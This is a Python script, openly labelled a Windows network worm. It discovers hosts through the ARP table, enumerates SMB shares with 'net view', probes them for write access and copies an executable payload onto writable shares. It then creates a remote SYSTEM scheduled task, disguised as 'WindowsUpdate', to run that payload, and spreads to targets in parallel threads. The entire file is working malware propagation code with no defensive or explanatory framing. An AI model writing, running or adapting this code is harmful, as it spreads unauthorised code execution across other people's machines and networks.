"""
Worm Propagation Script - Windows
Detects other hosts on network, finds writable shares, copies payload, executes
"""

import subprocess
import os
import re
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION ---
PAYLOAD_NAME = "monoukfile.exe"
PAYLOAD_PATH = r"C:\Temp\monoukfile.exe"

class Worm:
    def __init__(self):
        self.payload_path = PAYLOAD_PATH
        self.infected_hosts = set()
        self.max_workers = 10
    
    def log(self, msg, level="*"):
        print(f"[{level}] {msg}")
    
    def get_arp_hosts(self):
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=5)
            ips = re.findall(r'(\d+\.\d+\.\d+\.\d+)', result.stdout)
            ips = [ip for ip in ips if not ip.startswith('127.') and not ip.endswith('.1')]
            self.log(f"Found {len(set(ips))} hosts via ARP", "+")
            return list(set(ips))
        except Exception as e:
            self.log(f"ARP scan failed: {e}", "-")
            return []
    
    def get_shares(self, host):
        try:
            result = subprocess.run(['net', 'view', f'\\\\{host}'], 
                                  capture_output=True, text=True, timeout=3)
            shares = re.findall(r'^(\S.+?)\s+Disk', result.stdout, re.MULTILINE)
            return shares
        except:
            return []
    
    def is_writable(self, unc_path):
        try:
            test_file = os.path.join(unc_path, '.worm_test')
            with open(test_file, 'w') as f:
                f.write('test')
            os.remove(test_file)
            return True
        except:
            return False
    
    def copy_payload(self, unc_path):
        try:
            if not os.path.exists(self.payload_path):
                self.log(f"Payload not found: {self.payload_path}", "-")
                return False
            
            target = os.path.join(unc_path, PAYLOAD_NAME)
            with open(self.payload_path, 'rb') as src:
                with open(target, 'wb') as dst:
                    dst.write(src.read())
            
            self.log(f"Copied to {target}", "+")
            return True
        except Exception as e:
            self.log(f"Copy failed: {e}", "-")
            return False
    
    def execute_on_target(self, host, unc_path):
        try:
            payload_path = os.path.join(unc_path, PAYLOAD_NAME)
            #cmd = f'schtasks /s {host} /create /tn "WindowsUpdate" /tr "{payload_path}" /sc onlogon /ru SYSTEM /f'
            cmd = f'schtasks /s {host} /create /tn "WindowsUpdate" /tr "{payload_path}" /sc once /st 00:00 /ru SYSTEM /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                self.log(f"Task created on {host}", "+")
                return True
            return False
        except Exception as e:
            self.log(f"Execute failed: {e}", "-")
            return False
    
    def exploit_host(self, host):
        self.log(f"Targeting {host}", "*")
        
        shares = self.get_shares(host)
        if not shares:
            return False
        
        self.log(f"Shares found: {shares}", "+")
        
        for share in shares:
            unc_path = f'\\\\{host}\\{share}'
            
            if not self.is_writable(unc_path):
                continue
            
            self.log(f"Writable: {unc_path}", "+")
            
            if self.copy_payload(unc_path) and self.execute_on_target(host, unc_path):
                self.infected_hosts.add(host)
                self.log(f"INFECTED: {host}", "+")
                return True
        
        return False
    
    def run(self):
        self.log("Worm propagation started", "*")
        
        hosts = self.get_arp_hosts()
        self.log(f"Scanning {len(hosts)} targets", "*")
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            results = executor.map(self.exploit_host, hosts)
            infected = sum(1 for r in results if r)
        
        self.log(f"Propagation complete - {infected} hosts infected", "+")

if __name__ == "__main__":
    worm = Worm()
    worm.run()
